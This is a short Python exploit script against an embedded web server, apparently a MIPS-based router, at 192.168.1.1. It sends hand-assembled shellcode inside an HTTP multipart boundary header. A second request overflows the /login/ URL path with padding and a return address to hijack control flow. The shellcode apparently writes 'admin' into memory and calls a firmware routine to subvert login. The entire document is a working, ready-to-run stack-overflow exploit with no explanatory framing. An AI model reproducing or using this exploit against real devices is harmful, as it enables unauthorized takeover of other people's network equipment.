import socket
import struct

from socket import htonl, htons

p32  = lambda n   : struct.pack('>I', n)

IP   = "192.168.1.1"
PORT = 80

shellcode = [
    0x3c, 0x08, 0x80, 0x48,  #  lui    $t0, %hi(0x80482F28+8)
    0x35, 0x08, 0x2f, 0x30,  #  ori    $t0, $t0, %lo(0x80482F28+8)
    0x3c, 0x09, 0x61, 0x64,  #  lui    $t1, %hi(0x61646D69)
    0x35, 0x29, 0x6d, 0x69,  #  ori    $t1, $t1, %lo(0x61646D69)
    0xad, 0x09, 0xff, 0xf8,  #  sw     $t1, -8($t0)
    0x3c, 0x09, 0x6f, 0x55,  #  lui    $t1, 0x6F55
    0x3c, 0x0a, 0x01, 0x55,  #  lui    $t2, 0x0155
    0x01, 0x2a, 0x48, 0x22,  #  sub    $t1, $t1, $t2 
    0xad, 0x09, 0xff, 0xfc,  #  sw     $t1, -4($t0)
    0x3c, 0x0a, 0x80, 0x03,  #  lui    $t2, %hi(0x80030A68)
    0x35, 0x4a, 0x0a, 0x68,  #  ori    $t2, $t2, %lo(0x80030A68)
    0x01, 0x40, 0xf8, 0x09,  #  jalr   $t2
]
shellcode = bytes(shellcode)

def sendShellCode():
    io = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    io.connect((IP, PORT))
    request = b'' \
    + b'GET /login/arc.gif HTTP/1.1\r\n' \
    + b'Content-Type: multipart/form-data; boundary=------------' + shellcode + b'\r\n' \
    + b'\r\n' 
    io.send(request)
    io.recv(4096)
    io.close()

def hijackControlFlow():
    io = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    io.connect((IP, PORT))
    request = b'' \
    + b'GET /login/' + b'A'*0x109 + p32(0x801D1AE0) + b'/arc.gif HTTP/1.1\r\n' \
    + b'Host: 192.168.1.1\r\n' \
    + b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n' \
    + b'\r\n'
    io.send(request)
    io.recv(4096)
    io.close()

print('1. upload shellcode to 0x801D1AE0')
input('[y/n] ')
sendShellCode()
print('2. hijack to execute shellcode')
input('[y/n] ')
hijackControlFlow()
